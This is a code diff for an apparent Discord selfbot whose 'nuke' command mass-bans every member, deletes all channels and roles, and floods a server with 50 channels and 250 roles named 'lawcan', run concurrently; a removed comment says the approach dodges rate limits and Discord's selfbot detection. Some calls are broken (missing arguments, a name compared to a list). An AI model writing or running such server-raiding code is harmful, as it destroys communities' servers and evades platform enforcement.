@@ -600,18 +600,37 @@ async def getpfp(ctx, member: discord.User = None):
     pfp = member.avatar.url
     await ctx.send(f"{pfp}")
 
-async def deletechannels_webhook(ctx): # uses webhooks to delete all channels
-    """uses webhooks to delete every channel"""
+async def DeleteChannels(ctx):
+    """deletes every channel"""
     for channel in ctx.guild.channels:
+        if channel.name.lower() == "lawcan":  
+            continue  # skips channels named lawcan
+
         try:
             await channel.delete()
         except discord.Forbidden:
-            print(f"Cannot delete channel: {channel.name}. lf perms.")
+            printwordwithgradient(f"Cannot delete channel: {channel.name}. lf perms.")
         except discord.HTTPException as e:
-            print(f"Failed to delete channel: {channel.name} due to an HTTP error >.<. {e}")
+            printwordwithgradient(f"Failed to delete channel: {channel.name} due to an HTTP error >.<. {e}")
 
-async def massban_webhook(ctx, reason="lawcan"): 
-    """uses webhooks to ban all users"""
+async def MaxOutChannels(ctx, number=50, channel_name="lawcan"): 
+    """
+    maxes out channels
+    """
+    channel_amount = 0
+    while channel_amount < number:
+        try:
+            await ctx.guild.create_text_channel(channel_name)
+            channel_amount += 1
+        except discord.Forbidden:
+            printwordwithgradient("lf perms")
+            break
+        except discord.HTTPException as e:
+            printwordwithgradient(f"Failed to create channel due to an HTTP error >.<. error is {e}")
+            break
+
+async def MassBan(ctx, reason="lawcan"): 
+    """bans all users"""
     for member in ctx.guild.members:
         if member != ctx.bot.user:
             try:
@@ -621,79 +640,69 @@ async def massban_webhook(ctx, reason="lawcan"):
             except discord.HTTPException as e:
                 print(f"Failed to ban {member} due to an HTTP error. {e}")
 
-async def createchannels_webhook(ctx, number=50, channel_name="lawcan"): 
+async def DeleteRoles(ctx, webhook): # deletes all roles
     """
-    uses webhooks to max out channels
-    """
-    channel_amount = 0
-    while channel_amount < number:
-        try:
-            await ctx.guild.create_text_channel(channel_name)
-            channel_amount += 1
-        except discord.Forbidden:
-            print("lf perms")
-            break
-        except discord.HTTPException as e:
-            print(f"Failed to create channel due to an HTTP error >.<. error is {e}")
-            break
-
-async def deleteroles_webhook(ctx): # deletes all roles
-    """
-    uses webhooks to delete all roles
+    deletes all roles
     """
     roles = ctx.guild.roles
-    roles_to_delete = [role for role in roles if role.name != "@everyone" and role != ctx.guild.me.top_role]
+    roles_to_delete = [role for role in roles if role.name != ["@everyone", "lawcan"] and role != ctx.guild.me.top_role]
     for role in roles_to_delete:
         try:
             await role.delete()
         except discord.Forbidden:
-            print("lf perms")
+            printwordwithgradient("lf perms")
             return
         except discord.HTTPException as e:
-            print(f"HTTP error occurred while deleting role {role.name}: {e}")
+            printwordwithgradient(f"HTTP error occurred while deleting role {role.name}: {e}")
             return
 
-async def spamroles_webhook(ctx, number=250, role_name="lawcan"):
+async def SpamRole(ctx, channel: discord.TextChannel, number: int = 250, role_name: str = "lawcan"):
     """
-    uses webhooks to max out roles
+    Creates the max amount of roles
     """
+    # Create a webhook in the specified channel
+    try:
+        webhook = await channel.create_webhook(name="spam_roles")
+    except discord.Forbidden:
+        printwordwithgradient("needs perms")
+        return
+    except discord.HTTPException as e:
+        printwordwithgradient(f"HTTP error occurred while creating webhook: {e}")
+        return
+
     role_amount = 0
     while role_amount < number:
         try:
+            # Create a role in the guild
             await ctx.guild.create_role(name=role_name)
             role_amount += 1
+
         except discord.Forbidden:
-            print("lf perms")
+            printwordwithgradient("Lack of permissions to create roles.")
             break
         except discord.HTTPException as e:
-            print(f"HTTP error occurred while creating role: {e}")
+            printwordwithgradient(f"HTTP error occurred while creating role: {e}")
+            break
+        except Exception as e:
+            printwordwithgradient(f"An unexpected error occurred: {e}")
             break
 
 @bot.command()
-async def nuke(ctx): # uses webhooks to nuke a server while avoiding ratelimits and minimising chance of discord detecting selfbotting
+async def nuke(ctx): # gathers all nuke commands and processes them at once
+    """nukes discord server"""    
     await ctx.message.delete()
+    printwordwithgradient(f"nuking: {ctx.guild}")
     if not ctx.author.guild_permissions.ban_members:
         await ctx.send("You don't have perms silly :3.")
         return
     await webhookpurge(ctx)
-    #Assign a webhook for each action
-    webhookspam_channeldel = await ctx.channel.create_webhook(name="channeldelete_web")
-    webhookspam_massban = await ctx.channel.create_webhook(name="massban_web")
-    webhookspam_spamchannel = await ctx.channel.create_webhook(name="spamchannel_web")
-    webhookspam_delroles = await ctx.channel.create_webhook(name="delroles_web")
-    webhookspam_spamroles = await ctx.channel.create_webhook(name="spamroles_web")
 
-    #delete all channels and roles at the same time avoiding ratelimits
-    await asyncio.gather(
-        deletechannels_webhook(ctx),
-        deleteroles_webhook(ctx)
-    )
-    
-    #i hate this
     tasks = [
-        asyncio.create_task(massban_webhook(ctx, reason="lawcan")),
-        asyncio.create_task(createchannels_webhook(ctx, number=50, channel_name="lawcan")),
-        asyncio.create_task(spamroles_webhook(ctx, number=250, role_name="lawcan"))
+        asyncio.create_task(MassBan(ctx, reason="lawcan")),
+        asyncio.create_task(DeleteChannels(ctx)),
+        asyncio.create_task(MaxOutChannels(ctx,)),
+        asyncio.create_task(SpamRole(ctx,)),
+        asyncio.create_task(DeleteRoles(ctx,))
     ]
     await asyncio.gather(*tasks)
 
